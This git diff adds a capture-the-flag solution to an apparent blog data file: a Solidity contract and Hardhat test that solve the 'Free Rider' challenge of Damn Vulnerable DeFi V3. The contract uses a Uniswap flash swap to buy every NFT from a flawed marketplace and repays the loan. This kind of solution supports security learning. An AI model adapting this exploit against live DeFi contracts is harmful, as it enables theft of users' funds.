@@ -406,7 +406,6 @@ contract Exploit_Puppet {
 });`,
             ],
         },
-
         {
             id: "damn-vulnerable-defi-solutions-9-puppet-v2",
             title: `Damn Vulnerable DeFi V3 Solutions: Puppet V2`,
@@ -440,6 +439,117 @@ contract Exploit_Puppet {
     // to the amount of colletral needed before we manipulated the liquidity pool
     await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
 });`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-10-free-rider",
+            title: `Damn Vulnerable DeFi V3 Solutions: Free Rider`,
+            description: `My solution to the 10th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 10, 2023",
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
+import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+interface IMarketplace {
+    function buyMany(uint256[] calldata tokenIds) external payable;
+}
+
+interface IUniswapV2Pair {
+    function swap(
+        uint amount0Out,
+        uint amount1Out,
+        address to,
+        bytes calldata data
+    ) external;
+}
+
+interface IWETH is IERC20 {
+    function deposit() external payable;
+
+    function withdraw(uint amount) external;
+}
+
+contract Exploit_FreeRider is IUniswapV2Callee, IERC721Receiver {
+    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
+    address immutable bountyContract;
+    address immutable attackerEOA;
+    IUniswapV2Pair immutable pair;
+    IMarketplace immutable marketplace;
+    IERC721 immutable nft;
+    IWETH immutable weth;
+
+    constructor(
+        IUniswapV2Pair _pair,
+        IMarketplace _marketplace,
+        IERC721 _nft,
+        IWETH _weth,
+        address _bountyContract
+    ) payable {
+        bountyContract = _bountyContract;
+        attackerEOA = msg.sender;
+        pair = _pair;
+        marketplace = _marketplace;
+        nft = _nft;
+        weth = _weth;
+    }
+
+    function exploit() public {
+        bytes memory data = abi.encode(attackerEOA);
+        pair.swap(15 ether, 0, address(this), data); //borrow WETH
+    }
+
+    // This function is called by the pair contract
+    function uniswapV2Call(
+        address,
+        uint amount0,
+        uint,
+        bytes calldata data
+    ) public {
+        //convert all the borrowed WETH to ETH
+        weth.withdraw(weth.balanceOf(address(this)));
+        //buy all the NFTs in the market place
+        marketplace.buyMany{value: 15 ether}(tokenIds);
+        //transfer all the NFT to the recovery contract
+        for (uint256 i = 0; i < tokenIds.length; i++) {
+            nft.safeTransferFrom(address(this), bountyContract, tokenIds[i], data);
+        }
+        //calucate repay amount
+        uint fee = ((amount0 * 3) / 997) + 1;
+        uint amountToRepay = amount0 + fee;
+        weth.deposit{value: amountToRepay}(); //convert ETH to WETH
+        weth.transfer(address(pair), amountToRepay); //repay the borrowed amount
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes memory
+    ) external pure override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}`,
+                `it("Exploit", async function () {
+    attacker = await (
+        await ethers.getContractFactory("Exploit_FreeRider", player)
+    ).deploy(
+        uniswapPair.address,
+        marketplace.address,
+        nft.address,
+        weth.address,
+        devsContract.address,
+        { value: ethers.utils.parseEther("0.05") }
+    );
+    await attacker.exploit();
+});
+`,
             ],
         },
     ],
